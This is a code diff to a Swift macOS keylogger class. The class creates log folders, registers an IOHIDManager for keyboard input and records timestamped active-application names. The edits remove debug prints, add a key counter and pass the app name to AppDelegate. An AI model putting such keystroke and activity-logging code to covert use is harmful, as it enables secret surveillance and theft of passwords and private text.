@@ -19,15 +19,16 @@ class Keylogger
     var appData:URL                             // Folder
     var keyData:URL                             // Folder
     var devicesData:URL                         // Folder
+    var keyCount:Int
     
     init()
     {
-        print("init", bundlePathURL)
         appData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("App") // Creates App Folder in Data Folder
         keyData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Key") // Creates Key Folder in Data Folder
         devicesData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Devices") // Creates Devices Folder in Data Folder
         manager = IOHIDManagerCreate(kCFAllocatorDefault, IOOptionBits(kIOHIDOptionsTypeNone))
 
+        keyCount = 0
         if !(FileManager.default.fileExists(atPath: appData.path) && FileManager.default.fileExists(atPath: keyData.path))
         {
             do
@@ -82,7 +83,6 @@ class Keylogger
     
     @objc dynamic func activatedApp(notification: NSNotification)
     {
-        print("activatedApp")
         if  let info = notification.userInfo,
             let app = info[NSWorkspace.applicationUserInfoKey] as? NSRunningApplication,
             let name = app.localizedName
@@ -116,6 +116,7 @@ class Keylogger
             let timeStamp = Date().description(with: Locale.current) +  "\t\(self.appName)" + "\n"
             fh?.write(timeStamp.data(using: .utf8)!)
             print("activatedApp: ", self.appName)
+            AppDelegate.appName = self.appName
         }
     }
 
@@ -126,7 +127,6 @@ class Keylogger
         
         let resultAsSwiftDic = [kIOHIDDeviceUsagePageKey: inUsagePage, kIOHIDDeviceUsageKey : inUsage]
         let resultAsCFDic: CFMutableDictionary = resultAsSwiftDic as! CFMutableDictionary
-        print("result: ", resultAsCFDic)
         return resultAsCFDic
     }
     
@@ -148,7 +148,6 @@ class Keylogger
     {
         IOHIDManagerUnscheduleFromRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue);
     }
-    
     
     var keyMap: [UInt32:[String]]
     {
